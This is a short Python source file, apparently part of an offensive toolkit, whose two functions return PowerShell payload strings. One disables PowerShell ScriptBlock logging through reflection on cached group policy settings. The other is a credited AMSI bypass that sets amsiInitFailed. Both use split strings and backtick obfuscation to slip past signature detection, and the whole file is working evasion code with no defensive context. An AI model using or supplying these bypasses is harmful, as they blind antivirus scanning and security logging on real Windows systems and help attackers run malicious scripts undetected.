import helpers


def scriptBlockLogBypass():
    # ScriptBlock Logging bypass
    bypass = """
    $GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').\"GetFie`ld\"('cachedGroupPolicySettings','N'+'onPublic,Static');
    If($GPF){
        $GPC=$GPF.GetValue($null);
        If($GPC['ScriptB'+'lockLogging']){
            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
            $GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
        }
        $val=[Collections.Generic.Dictionary[string,System.Object]]::new();
        $val.Add('EnableScriptB'+'lockLogging',0);
        $val.Add('EnableScriptBlockInvocationLogging',0);
        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
    } Else {
        [ScriptBlock].\"GetFie`ld\"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
    }
    """
    return bypass.replace('\n','').replace('    ', '')


def AMSIBypass():
    # @mattifestation's AMSI bypass
    bypass = """
    $Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');$Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
    """
    return bypass.replace('\n','').replace('    ', '')
